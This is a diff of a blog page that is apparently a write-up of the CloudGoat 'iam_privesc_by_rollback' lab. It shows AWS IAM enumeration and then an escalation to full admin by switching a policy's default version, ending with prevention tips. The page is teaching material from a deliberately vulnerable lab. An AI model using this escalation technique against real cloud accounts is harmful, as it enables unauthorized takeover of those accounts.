@@ -37,73 +37,177 @@
                 <div class="col-sm-8 blog-main">
                     <div class="blog-post" data-spy="scroll" data-target="#sidebar" data-offset="15">
                         <p>According to the official documentation for this scenario (<a href="https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/iam_privesc_by_rollback">here</a>) the overall goal is to "Acquire full admin privileges."</p>
+                        <p>We can create the challenge by running</p>
+                        <pre><code>python3 cloudgoat.py create iam_privesc_by_rollback</code></pre>
+                        <p>The build process will begin and when it finishes we will be provided with a set of credentials for the Raynor user account.</p>
+                        <hr />
 
-                        <p>For this challenge we'll start by leveraging the Pacu tool to do some basic account enumeration:</p>
-                        <pre><code>run iam__enum_account</code></pre>
-                        <p>Looking at the output, we do not have enough permission.</p>
-                        <pre><code>iam__bruteforce_permissions<br />iam__enumer_users_roles_policies_groups</code></pre>
-                        <p>Then within Pacu we can run the 'Data' command to see information associated with the finds. Looks like tehre is a specific policy listed for our user account.</p>
-                        <pre><code>aws iam list-policy-versions --policy-arn arn:aws:iam::94488810:policy/cg-raynor-policy</code></pre>
-                        <p>Notice default version is 1</p>
-                        <p>#Screenshot here</p>
-                        <pre><code>aws iam get-policy-version --policy arn:aws:iam::94488810:policy/cg-raynor-policy --version-id v3</code></pre>
-                        <p>Notice version</p>
-                        <pre><code>aws iam set-default-policy-version --policy arn:aws:iam::94488810:policy/cg-raynor-policy --version-id v3</code></pre>
-                        <p>Now run the list policy versions command, notice default is now 3</p>
-                        <pre><code>aws iam list-policy-versions --policy-arn arn:aws:iam::94488810:policy/cg-raynor-policy</code></pre>
-                        <p>And we can now run aws__enum_account. Which in this case we have full administrative rights.</p>
-                        <p>Place holder for initial port of all of this from another format. Much more detail coming.</p>
+
+                        <h3 id="raynor">Raynor</h3>
+                        <p>In the real world, we probably wouldn't just be handed these credentials. However, people make mistakes and credentials are often accidentally exposed. Let's start doing basic enumeration and see if we can determine what things we have access to. To do this we'll run the following set of commands just to poke at a few of the more common services:</p>
+                        <pre><code>
+                          aws --profile solus s3 ls<br />
+                          aws --profile solus ec2 describe-instances<br />
+                          aws --profile solus iam list-roles<br />
+                          aws --profile solus lambda list-functions
+                        </code></pre>
+                        <p>All of the api calls fail with the exeption being <code>iam list-roles</code>. We can clean the output up by using jq:</p>
+                        <pre><code>aws --profile raynor iam list-roles | jq '.Roles[].RoleName'</code></pre>
+                        <p>This command will produce an output similar to the one below.</p>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_rollback/jq_list_roles.png" alt="list_roles" class="img-fluid">
+                        <p>The key takeaway here is that we have access to a user account with some level of IAM permissions. How much access do we have? One way to find out is by leveraging Pacu to bruteforce those permissions for us. The other option is to make iam calls one at a time to determine where our limits may exist. For this example we'll leverage Pacu and run the iam__enum_users_roles_policies_groups module.</p>
+                        <pre><code>run iam__enum_users_roles_policies_groups</code></pre>
+                        <p>Once the module finishes its execution we see that it successfully enumeated various aspects of the account.</p>
+                        <img src="../static/images/Cloud_Goat/iam_privesc_by_rollback/iam_enum_results.png" alt="iam_enum_results" class="img-fluid">
+                        <p>We can run the <code>data IAM</code> command to see information associated with the enumeration. At first glance of the policies it appears there is a specific policy listed for our user account: <code>cg-raynor-policy</code></p>
+                        <pre><code>
+                            "Policies": [<br />
+                            &emsp;{<br />
+                            &emsp;&emsp;"PolicyName": "cg-raynor-policy",<br />
+                            &emsp;&emsp;"PolicyId": "ANPA5X73I5MBNC3PRT6CO",<br />
+                            &emsp;&emsp;"Arn": "arn:aws:iam::121212121212:policy/cg-raynor-policy",<br />
+                            &emsp;&emsp;"Path": "/",<br />
+                            &emsp;&emsp;"DefaultVersionId": "v1",<br />
+                            &emsp;&emsp;"AttachmentCount": 1,<br />
+                            &emsp;&emsp;"IsAttachable": true,<br />
+                            &emsp;&emsp;"CreateDate": "Mon, 25 May 2020 14:24:46",<br />
+                            &emsp;&emsp;"UpdateDate": "Mon, 25 May 2020 14:24:48"<br />
+                            &emsp;}<br />
+                        ],
+                        </code></pre>
+
+                        <p>Looking at the details above we can also tell that the policy is curently attached <code>AttachmentCount: 1</code> and the version being used is v1 <code>DefaultVersionId: v1</code>. If we wanted to leverage the aws cli in place of Pacu we could run the command below. The command is filtering to show only those policies which are currently attached to a resource.</p>
+
+                        <pre><code>
+                            aws --profile raynor iam list-policies --only-attached --scope Local<br /><br />
+                            {<br />
+                            &emsp;"Policies": [<br />
+                            &emsp;&emsp;{<br />
+                            &emsp;&emsp;&emsp;"PolicyName": "cg-raynor-policy",<br />
+                            &emsp;&emsp;&emsp;"PolicyId": "ANPA5X73I5MBNC3PRT6CO",<br />
+                            &emsp;&emsp;&emsp;"Arn": "arn:aws:iam::121212121212:policy/cg-raynor-policy",<br />
+                            &emsp;&emsp;&emsp;"Path": "/",<br />
+                            &emsp;&emsp;&emsp;"DefaultVersionId": "v1",<br />
+                            &emsp;&emsp;&emsp;"AttachmentCount": 1,<br />
+                            &emsp;&emsp;&emsp;"PermissionsBoundaryUsageCount": 0,<br />
+                            &emsp;&emsp;&emsp;"IsAttachable": true,<br />
+                            &emsp;&emsp;&emsp;"CreateDate": "2020-05-25T14:24:46Z",<br />
+                            &emsp;&emsp;&emsp;"UpdateDate": "2020-05-25T14:24:48Z"<br />
+                            &emsp;&emsp;}<br />
+                            &emsp;]<br />
+                            }
+                        </code></pre>
+                        <p>The next question we have to answer is the policy attached to our user account? We can do that by quering the <code>list-attached-user-policies</code> endpoint and our user name <code>raynor</code>. An example command and output is below.</p>
+
+                        <pre><code>
+                            aws --profile raynor iam list-attached-user-policies --user-name raynor<br /><br />
+                            {<br />
+                            &emsp;"AttachedPolicies": [<br />
+                            &emsp;&emsp;{<br />
+                            &emsp;&emsp;&emsp;"PolicyName": "cg-raynor-policy",<br />
+                            &emsp;&emsp;&emsp;"PolicyArn": "arn:aws:iam::121212121212:policy/cg-raynor-policy"<br />
+                            &emsp;&emsp;}<br />
+                            &emsp;]<br />
+                            }<br />
+                        </code></pre>
+                        <hr />
+
+                        <h3 id="versions">Versions</h3>
+                        <p>Good news, it appears the raynor policy is currently associated with the raynor user account. Lets see if we can learn more about what we are allowed to do and what we are not allowed to do. We can accomplish this by making a call to the <code>get-policy-version</code> endpoint as seen below.</p>
+                        <pre><code>
+                            aws --profile raynor iam get-policy-version --policy-arn arn:aws:iam::121212121212:policy/cg-raynor-policy --version-id v1<br /><br />
+
+                            {<br />
+                            &emsp;"PolicyVersion": {<br />
+                            &emsp;&emsp;"Document": {<br />
+                            &emsp;&emsp;&emsp;"Version": "2012-10-17",<br />
+                            &emsp;&emsp;&emsp;"Statement": [<br />
+                            &emsp;&emsp;&emsp;&emsp;{<br />
+                            &emsp;&emsp;&emsp;&emsp;&emsp;"Sid": "IAMPrivilegeEscalationByRollback",<br />
+                            &emsp;&emsp;&emsp;&emsp;&emsp;"Action": [<br />
+                            &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;"iam:Get*",<br />
+                            &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;"iam:List*",<br />
+                            &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;"iam:SetDefaultPolicyVersion"<br />
+                            &emsp;&emsp;&emsp;&emsp;&emsp;],<br />
+                            &emsp;&emsp;&emsp;&emsp;&emsp;"Effect": "Allow",<br />
+                            &emsp;&emsp;&emsp;&emsp;&emsp;"Resource": "*"<br />
+                            &emsp;&emsp;&emsp;&emsp;}<br />
+                            &emsp;&emsp;&emsp;]<br />
+                            &emsp;&emsp;},<br />
+                            &emsp;&emsp;"VersionId": "v1",<br />
+                            &emsp;&emsp;"IsDefaultVersion": true,<br />
+                            &emsp;&emsp;"CreateDate": "2020-05-25T14:24:46Z"<br />
+                            &emsp;}<br />
+                            }
+
+                        </code></pre>
+                        <p>For the call to work we specified the policy arn as well as the version currently applied. From the output it looks like we can make calls to iam resources if they are a Get, List, or SetDefaultPolicyVersion. That last one is interesting. Perhaps our currently policy has more than one version? Let's check to see if version 2 of our policy exists. The results are below:</p>
+                        <pre><code>
+                            aws --profile raynor iam get-policy-version --policy-arn arn:aws:iam::121212121212:policy/cg-raynor-policy --version-id v2<br /><br />
+
+                            {<br />
+                                &emsp;"PolicyVersion": {<br />
+                                &emsp;&emsp;"Document": {<br />
+                                &emsp;&emsp;&emsp;"Version": "2012-10-17",<br />
+                                &emsp;&emsp;&emsp;"Statement": [<br />
+                                &emsp;&emsp;&emsp;&emsp;{<br />
+                                &emsp;&emsp;&emsp;&emsp;&emsp;"Action": "*",<br />
+                                &emsp;&emsp;&emsp;&emsp;&emsp;"Effect": "Allow",<br />
+                                &emsp;&emsp;&emsp;&emsp;&emsp;"Resource": "*"<br />
+                                &emsp;&emsp;&emsp;&emsp;}<br />
+                                &emsp;&emsp;&emsp;]<br />
+                                &emsp;&emsp;},<br />
+                                &emsp;&emsp;"VersionId": "v2",<br />
+                                &emsp;&emsp;"IsDefaultVersion": false,<br />
+                                &emsp;&emsp;"CreateDate": "2020-05-25T14:24:48Z"<br />
+                                &emsp;}<br />
+                                }
+                        </code></pre>
+                        <p>Interesting, a version 2 of the policy does exist, and it gives full admin access to the entire account. Our current policy provides us with the ability to set the default version of a policy. If we were to change the default version of the policy currently applied to our user account from 1 to 2 we could escalate our privledges to full admin. </p>
+                        <p>The command below will accomplish this.</p>
+                        <pre><code>aws --profile raynor iam set-default-policy-version --policy arn:aws:iam::121212121212:policy/cg-raynor-policy --version-id v2</code></pre>
+                        <p>If successful there will be no response. We can validate the command was successful by re-running the <code>list-policies</code> command:</p>
+                        <pre><code>
+                            aws --profile raynor iam list-policies --only-attached --scope Local<br /><br />
+                            {<br />
+                            &emsp;"Policies": [<br />
+                            &emsp;&emsp;{<br />
+                            &emsp;&emsp;&emsp;"PolicyName": "cg-raynor-policy",<br />
+                            &emsp;&emsp;&emsp;"PolicyId": "ANPA5X73I5MBNC3PRT6CO",<br />
+                            &emsp;&emsp;&emsp;"Arn": "arn:aws:iam::121212121212:policy/cg-raynor-policy",<br />
+                            &emsp;&emsp;&emsp;"Path": "/",<br />
+                            &emsp;&emsp;&emsp;"DefaultVersionId": "v2",<br />
+                            &emsp;&emsp;&emsp;"AttachmentCount": 1,<br />
+                            &emsp;&emsp;&emsp;"PermissionsBoundaryUsageCount": 0,<br />
+                            &emsp;&emsp;&emsp;"IsAttachable": true,<br />
+                            &emsp;&emsp;&emsp;"CreateDate": "2020-05-25T14:24:46Z",<br />
+                            &emsp;&emsp;&emsp;"UpdateDate": "2020-05-25T18:28:50Z"<br />
+                            &emsp;&emsp;}<br />
+                            &emsp;]<br />
+                            }
+                        </code></pre>
+                        <p>Notice the default version has changed from <code>v1</code> to <code>v2</code>. At this point we have full administrative rights to this aws account.</p>
+
+                        <hr />
+                        <h3 id="prevention">Prevention</h3>
+                        <p>So, how do we prevent this. Where did the owner of this account go wrong? There are a few places where this could have be stopped. Lets dive into them.</p>
+                        <ol>
+                          <li>The most important is to not expose credentials. If we were not able to leverage raynors credentials we would not have been able to authenticate and further escalate privileges.</li>
+                          <li>Limit what users can do. The policy associated with raynor allowed for too much access. I imagine in the real world a user with this set of actions at there disposal would likely have much more persmissions within the account. </li>
+                        </ol>
+
                     </div><!-- /.blog-post -->
                 </div><!-- /.blog-main -->
 
-                <!-- Blog Side Bar-->
-                <div class="col-md-3" id=sidebar data-spy="affix" data-offset-top="10">
-                    
+                    <!-- Blog Side Bar-->
+                <div class="col-md-3" id=sidebar data-spy="affix-bottom" data-offset-top="0">
+
                     <nav class="post-sidebar hidden-print hidden-sm hidden-xs affix sticky" id="post-nav">
                         <h5>contents</h5>
                         <ul class="nav post-sidenav"> 
-                            <li class=""> <a href="#what_is_it">What is it</a> </li>
-                            <li class=""> <a href="#event_triggers">Event Triggers</a>
-                                <ul class="nav"> 
-                                    <li class=""><a href="#triggers-request">Request</a> </li>
-                                    <li class=""><a href="#triggers-email">Email</a> </li> 
-                                    <li class=""><a href="#triggers-schedule">Schedule</a> </li>
-                                    <li class=""><a href="#triggers-created">When a Document is Created</a> </li>  
-                                    <li class=""><a href="#triggers-other">Others</a> </li>    
-                                </ul> 
-                            </li>
-                            <li class=""> <a href="#data_exfiltration">Data Exfiltration</a> 
-                                <ul class="nav"> 
-                                    <li class=""><a href="#exfil-forward">Forward a Copy of All Emails</a> </li>
-                                    <li class=""><a href="#exfil-sharepoint">New SharPoint File -> HTTP POST</a> </li> 
-                                    <li class=""><a href="#exfil-onedrive">New OneDrive File -> SFTP</a> </li>   
-                                </ul> 
-                            </li>
-                            <li class=""> <a href="#persistence">Persistence</a> </li>
-                            <li class=""> <a href="#internal_network">Internal Network</a> 
-                                <ul class="nav"> 
-                                    <li class=""><a href="#internal-onedrive">OneDrive</a> </li>
-                                    <li class=""><a href="#internal-data-gateway">Data Gateway</a> </li>   
-                                </ul> 
-                            </li>
-                            <li class=""> <a href="#security_controls">Security Controls</a>
-                                <ul class="nav"> 
-                                    <li class=""><a href="#control-dlp">Data Loss Prevention</a> </li>
-                                    <li class=""><a href="#control-log">Logging</a> </li> 
-                                    <li class=""><a href="#contorl-event-types">Event Types</a> </li>  
-                                    <li class=""><a href="#contorl-event-details">Event Details</a> </li> 
-                                    <li class=""><a href="#contorl-flow-details">Flow Details</a> </li>
-                                    <li class=""><a href="#contorl-quotas">Quotas</a> </li>
-                                </ul>  
-                            </li>
-                            <li class=""> <a href="#fun_nuances">Fun Nuances</a> 
-                                <ul class="nav"> 
-                                    <li class=""><a href="#fun-import">Import Pre-Built Flows</a> </li>
-                                    <li class=""><a href="#fun-disabled">Disabled Accounts</a> </li>
-                                    <li class=""><a href="#fun-special">Special Connectors</a> </li>
-                                    <li class=""><a href="#fun-failure">Flow Failures</a> </li>
-                                </ul>  
-                            </li>
+                            <li class=""> <a href="#raynor">Raynor</a> </li>
+                            <li class=""> <a href="#versions">Versions</a> </li>
+                            <li class=""> <a href="#prevention">Prevention</a></li>
                             <li class=""> <a href="#top">Top</a> </li>
                     </nav>
                 </div><!-- /.blog-sidebar -->
